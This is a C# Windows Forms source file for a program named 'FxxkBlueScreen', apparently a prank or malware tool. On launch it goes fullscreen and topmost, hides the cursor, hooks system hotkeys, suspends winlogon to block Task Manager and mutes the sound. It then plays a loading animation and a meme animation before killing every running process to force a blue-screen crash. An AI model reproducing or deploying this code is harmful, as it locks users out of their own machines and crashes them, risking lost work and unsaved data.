using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;

using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
namespace FxxkBlueScreen
{
    public partial class MainForm : Form
    {
        #region 浏览器相关
        /// <summary>  
        /// 修改注册表IE版本来兼容当前程序  
        /// </summary>  
        static void SetWebBrowserFeatures(int ieVersion)
        {
            if (LicenseManager.UsageMode != LicenseUsageMode.Runtime)
                return;
            var appName = System.IO.Path.GetFileName(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
            UInt32 ieMode = GeoEmulationModee(ieVersion);
            var featureControlRegKey = @"HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\FeatureControl\";
            Registry.SetValue(featureControlRegKey + "FEATURE_BROWSER_EMULATION",
                appName, ieMode, RegistryValueKind.DWord);
            Registry.SetValue(featureControlRegKey + "FEATURE_ENABLE_CLIPCHILDREN_OPTIMIZATION", appName, 1, RegistryValueKind.DWord);
        }

        /// <summary>  
        /// 获取浏览器的版本  
        /// </summary>  
        static int GetBrowserVersion()
        {
            int browserVersion = 0;
            using (var ieKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Internet Explorer", RegistryKeyPermissionCheck.ReadSubTree, System.Security.AccessControl.RegistryRights.QueryValues))
            {
                var version = ieKey.GetValue("svcVersion");
                if (null == version)
                {
                    version = ieKey.GetValue("Version");
                    if (null == version)
                        throw new ApplicationException("Microsoft Internet Explorer is required!");
                }
                int.TryParse(version.ToString().Split('.')[0], out browserVersion);
            }
            if (browserVersion < 7)
            {
                throw new ApplicationException("不支持的浏览器版本!");
            }
            return browserVersion;
        }

        /// <summary>
        /// 得到浏览器的模式的值  
        /// </summary>
        static UInt32 GeoEmulationModee(int browserVersion)
        {
            UInt32 mode = 11000;
            switch (browserVersion)
            {
                case 7:
                    mode = 7000;
                    break;
                case 8:
                    mode = 8000;
                    break;
                case 9:
                    mode = 9000;
                    break;
                case 10:
                    mode = 10000;
                    break;
                case 11:
                    mode = 11000;
                    break;
            }
            return mode;
        }
        #endregion

        #region 动画相关
        /// <summary>
        /// 全屏
        /// </summary>
        private void FullScreen()
        {
            int w = System.Windows.Forms.SystemInformation.VirtualScreen.Width;
            int h = System.Windows.Forms.SystemInformation.VirtualScreen.Height;
            this.MaximumSize = new Size(w, h);
            this.MinimumSize = new Size(w, h);
            this.Location = new Point(0, 0);
            this.Width = w;
            this.Height = h;
            this.TopMost = true;
        }
        /// <summary>
        /// 显示Loading动画
        /// </summary>
        private void ShowLoading()
        {
            LoadingBrowser.Visible = true;
            HuajiBrowser.Visible = false;
            Assembly assembly = Assembly.GetAssembly(GetType());
            Stream loadingStream = assembly.GetManifestResourceStream("FxxkBlueScreen.html.Loading.html");
            Encoding encode = System.Text.Encoding.GetEncoding("UTF-8");
            StreamReader loadingStreamReader = new StreamReader(loadingStream, encode);
            string strloadinghtml = loadingStreamReader.ReadToEnd();
            LoadingBrowser.DocumentText = strloadinghtml;
        }
        /// <summary>
        /// 显示Huaji动画
        /// </summary>
        private void ShowHuaji()
        {
            HuajiBrowser.Visible = true;
            LoadingBrowser.Visible = false;
            Assembly assembly = Assembly.GetAssembly(GetType());
            Stream huajiStream = assembly.GetManifestResourceStream("FxxkBlueScreen.html.Huaji.html");
            Encoding encode = System.Text.Encoding.GetEncoding("UTF-8");
            StreamReader huajiStreamReader = new StreamReader(huajiStream, encode);
            string strHuajiHtml = huajiStreamReader.ReadToEnd();
            HuajiBrowser.DocumentText = strHuajiHtml;
        }
        #endregion

        /// <summary>
        /// 让系统蓝屏
        /// </summary>
        private void Boom()
        {
            Process.GetProcesses().ToList().ForEach(p => { try { p.Kill(); } catch { } });
        }

        public MainForm()
        {
            InitializeComponent();
            Control.CheckForIllegalCrossThreadCalls = false;//取消跨线程检查
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            SetWebBrowserFeatures(11);//设置IE版本为11
            Cursor.Hide();//隐藏鼠标指针
            FullScreen();//全屏
            HotKeyHandler hotKeyHandler = HotKeyHandler.Instance;
            hotKeyHandler.HookStart();//屏蔽系统热键
            hotKeyHandler.SuspendWinLogon();//屏蔽任务管理器
            SetsysVolume.Mute();//静音
            //异步执行
            Task.Factory.StartNew(() =>
            {
                ShowLoading();//显示Loading动画
                Thread.Sleep(25000);//延时25s
                ShowHuaji();//显示Huaji动画
                Thread.Sleep(7000);//延时7s
                //Application.Exit();//调试时用，退出，编译时注释掉
                Boom();//蓝屏
            });
        }
    }
}
